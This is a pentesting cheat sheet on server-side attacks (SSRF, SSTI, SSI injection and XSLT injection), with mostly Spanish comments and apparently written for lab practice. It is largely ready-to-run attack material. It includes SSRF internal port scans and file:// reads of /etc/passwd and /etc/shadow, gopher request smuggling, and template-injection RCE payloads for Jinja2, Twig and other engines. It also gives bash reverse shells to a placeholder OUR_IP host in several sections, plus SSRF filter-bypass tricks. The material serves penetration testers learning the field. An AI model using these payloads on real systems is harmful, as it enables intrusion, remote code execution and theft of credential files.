---
title: "Server-side Attacks"
description: "SSRF, SSTI, SSI injection, and XSLT injection."
sidebar:
  order: 12
  label: "Server-side Attacks"
---
> SSRF, SSTI, SSI Injection, and XSLT Injection: identification, exploitation, and tools for each server-side attack vector.

---


## SSRF — Server-Side Request Forgery

### Confirming SSRF

```bash
# 1. Identificar parámetro que acepta URL (ej: dateserver=http://...)
# 2. Lanzar listener
nc -lnvp 8000

# 3. Inyectar URL propia en el parámetro
curl -X POST http://TARGET/index.php \
     -d "dateserver=http://OUR_IP:8000/ssrf&date=2024-01-01"
# Si nc recibe conexión → SSRF confirmado

# 4. Verificar si es blind (response no se refleja)
curl -X POST http://TARGET/index.php \
     -d "dateserver=http://127.0.0.1/index.php&date=2024-01-01"
# Si response contiene HTML de la app → no blind; si responde genérico → blind SSRF
```

### Internal Port Scan via SSRF

```bash
# Identificar error en puerto cerrado (ej: "Failed to connect to")
# Luego filtrar para encontrar puertos abiertos

seq 1 10000 > ports.txt

ffuf -w ./ports.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
     -fr "Failed to connect to"

# Puertos típicos a encontrar:
# 80/443 → web app interna
# 3306 → MySQL
# 5432 → PostgreSQL
# 6379 → Redis
# 27017 → MongoDB
# 8080/8443 → Tomcat/otro servicio
```

### Enumerating Internal Endpoints via SSRF

```bash
# Directory brute-force via SSRF (accediendo a dominio interno no accesible directamente)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "dateserver=http://internal.htb/FUZZ.php&date=2024-01-01" \
     -fr "Server at internal.htb Port 80"   # filtra 404 y 403 de Apache
```

### LFI via file://

```bash
# Leer archivos locales del servidor a través de SSRF
curl -X POST http://TARGET/index.php \
     -d "dateserver=file:///etc/passwd&date=2024-01-01"

# Archivos objetivo:
# file:///etc/passwd
# file:///etc/shadow (si hay privilegios)
# file:///var/www/html/config.php
# file:///proc/self/environ
```

### Gopher — POST Requests via SSRF

```bash
# Construir HTTP POST request manualmente para enviar via gopher://
# Payload en texto plano:
POST /admin.php HTTP/1.1
Host: internal.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin

# Convertir a URL gopher (espacios=%20, newlines=%0D%0A):
# gopher://internal.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internal.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

# URL-encodear la URL gopher COMPLETA antes de ponerla en el parámetro POST
# (double encoding: %25 para %, %252F para /)

# Herramienta: Gopherus (Python2)
git clone https://github.com/tarunkant/Gopherus
python2.7 gopherus.py --exploit smtp    # SMTP
python2.7 gopherus.py --exploit mysql   # MySQL
python2.7 gopherus.py --exploit redis   # Redis
```

### Blind SSRF — Techniques

```bash
# Enumerar puertos: buscar diferencias en mensajes de error
# Puerto abierto (HTTP válido): "date unavailable"
# Puerto cerrado: "Something went wrong!"

# Enumerar archivos: diferencia de error para existente vs no existente
# Archivo existe: "date unavailable"
# Archivo no existe: "Something went wrong!"

# Interactuar con servicios internos "a ciegas" → payloads conocidos
```

---

## SSTI — Server-Side Template Injection

### Confirming and Detecting the Engine

```bash
# 1. String de prueba (rompe la mayoría de template engines)
${{<%[%'"}}%\.

# 2. Si hay error → probar payloads de identificación
${7*7}      # → no ejecutado: seguir por Jinja/Twig path
{{7*7}}     # → ejecutado como 49: seguir

# 3. Identificar engine exacto
{{7*'7'}}   # Jinja2 → "7777777" | Twig → "49"

# Árbol de decisión completo:
# ${7*7} ejecutado → Freemarker o similares
# ${7*7} no ejecutado → probar {{7*7}}
#   {{7*7}} ejecutado → probar {{7*'7'}}
#     Resultado "7777777" → Jinja2 (Python)
#     Resultado "49" → Twig (PHP)
#   {{7*7}} no ejecutado → probar #{7*7} → Smarty/otros
```

### Jinja2 (Flask/Django — Python)

```jinja2
# Info disclosure — config de la app (secret keys, etc.)
{{ config.items() }}

# Built-in functions disponibles
{{ self.__init__.__globals__.__builtins__ }}

# LFI — leer archivos
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE — ejecutar comandos (importar os si no está disponible)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# RCE alternativo más corto (si os ya está importado)
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Reverse shell via SSTI Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/OUR_IP/PORT 0>&1"').read() }}
```

### Twig (Symfony/PHP)

```twig
# Info disclosure
{{ _self }}

# LFI (requiere Symfony → filter file_excerpt)
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# RCE — usar system() de PHP via filter
{{ ['id'] | filter('system') }}

# RCE con comando personalizado
{{ ['bash -c "id"'] | filter('system') }}

# Reverse shell
{{ ['bash -c "bash -i >& /dev/tcp/OUR_IP/PORT 0>&1"'] | filter('system') }}
```

### Other Engines — Basic Payloads

| Engine | Info | RCE |
|--------|------|-----|
| **Freemarker** | `${7*7}` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Smarty** | `{php}echo 'test';{/php}` | `{system('id')}` |
| **Velocity** | `$class.inspect("java.lang.Runtime")` | `#set($e="")$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(...)` |
| **Pebble** | `{{ 1+1 }}` | `{% set cmd = "id" %}{% set exec = "java.lang.Runtime".exec(cmd) %}` |

### SSTImap — Automatic Tool

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Detección automática
python3 sstimap.py -u http://TARGET/index.php?name=test

# Ejecutar comando
python3 sstimap.py -u http://TARGET/index.php?name=test -S id

# Shell interactivo
python3 sstimap.py -u http://TARGET/index.php?name=test --os-shell

# Descargar archivo
python3 sstimap.py -u http://TARGET/index.php?name=test -D '/etc/passwd' './passwd'

# POST parameter
python3 sstimap.py -u http://TARGET/index.php -X POST -d "name=test" --engine Jinja2
```

---

## SSI Injection — Server-Side Includes

### Identifying SSI

```bash
# Extensiones que suelen usar SSI: .shtml, .shtm, .stm
# Buscar en la respuesta o URL:
curl -s http://TARGET/ | grep -iE "\.shtml|\.shtm|\.stm"

# También posible en .html si el servidor está configurado para ello
```

### SSI Payloads

```html
<!-- Confirmar SSI injection (imprimir variables de entorno) -->
<!--#printenv -->

<!-- Echo de variables específicas -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="LAST_MODIFIED" -->

<!-- RCE via exec (impacto máximo) -->
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/OUR_IP/PORT 0>&1'" -->

<!-- Include de archivo local -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="config.php" -->

<!-- Config SSI (cambiar mensaje de error) -->
<!--#config errmsg="Error!" -->
```

### Exploitation Example

```bash
# Si el campo "name" en un form se refleja en una página .shtml:
curl -X POST http://TARGET/form.php \
     -d "name=<!--%23exec%20cmd%3D%22id%22%20-->"

# URL encoded: <!--#exec cmd="id" -->
# %3C%21--%23exec%20cmd%3D%22id%22%20--%3E

# Sin encoding si el form acepta HTML directamente:
# Introducir en el campo: <!--#exec cmd="id" -->
```

---

## XSLT Injection

### Confirming XSLT Injection

```bash
# Inyectar un tag XML roto para provocar error
# Introducir en el campo: <
# Si responde 500 → posible XSLT injection
```

### Processor Information

```xml
<!-- Inyectar en el parámetro vulnerable -->
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

### LFI via XSLT

```xml
<!-- XSLT 2.0 (unparsed-text) -->
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />

<!-- PHP functions habilitadas (libxslt con PHP) -->
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />

<!-- Versión alternativa con readfile -->
<xsl:value-of select="php:function('readfile','/etc/passwd')" />
```

### RCE via XSLT

```xml
<!-- PHP functions habilitadas -->
<xsl:value-of select="php:function('system','id')" />
<xsl:value-of select="php:function('shell_exec','id')" />
<xsl:value-of select="php:function('passthru','id')" />

<!-- Reverse shell via XSLT + PHP -->
<xsl:value-of select="php:function('system','bash -c &quot;bash -i &gt;&amp; /dev/tcp/OUR_IP/PORT 0&gt;&amp;1&quot;')" />
```

---

## Quick Vulnerability Identification

| Sign | Probable Type |
|-------|---------------|
| Parameter with complete URL in POST body | SSRF |
| Error when injecting `${{<%[%'"}}%\.` in text field | SSTI |
| URL ends in `.shtml`, `.shtm`, `.stm` | SSI |
| Text field reflected in page with XML/XSL data | XSLT |
| Field "dateserver", "url", "page", "resource" with http value | SSRF |
| Output reflects `{{7*7}}` as `49` | SSTI (Jinja/Twig) |

---

## Pitfalls / Gotchas

- **Blind SSRF:** if the response is not reflected, use subtle error differences (different message for open vs closed ports). Always confirm first with your own nc listener.
- **Gopher double encoding:** the gopher URL within a POST parameter needs double URL-encoding (`%25` for `%`, `%252F` for `/`). Without this → `Malformed URL` error.
- **SSTI `{{7*'7'}}` to distinguish Jinja vs Twig:** Jinja → `7777777`, Twig → `49`. Do not attempt direct RCE without identifying the engine — the syntax is different.
- **SSI `exec` might be disabled:** if `<!--#exec cmd="id" -->` does not work but `<!--#printenv -->` does, the `exec` directive is disabled in the server config.
- **XSLT `php:function` only if enabled:** most libxslt installations disable PHP functions for security. Without `php:function`, try `unparsed-text` (XSLT 2.0+ only).
- **SSTImap detects but does not always exploit:** if SSTImap identifies the engine but fails at RCE, try manual payloads specific to the engine.
- **SSRF filter bypass:** if the server filters `127.0.0.1`, try: `localhost`, `0.0.0.0`, `[::1]`, `127.1`, `127.0.1`, `0x7F000001` (hex), `2130706433` (decimal).

---

## Related Cheatsheets

- [Web Requests](/en/metodologias/fundamentos/web-requests/) — HTTP, cURL, curl for manual SSRF
- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — ffuf for port scanning and enumerating endpoints via SSRF
- [JavaScript Deobfuscation](/en/metodologias/recon/javascript-deobfuscation/) — finding URL parameters in JS
- [API Attacks](/en/metodologias/web/api-attacks/) — SSRF in REST API contexts
- [Attacking GraphQL](/en/metodologias/web/attacking-graphql/) — SSRF via GraphQL queries
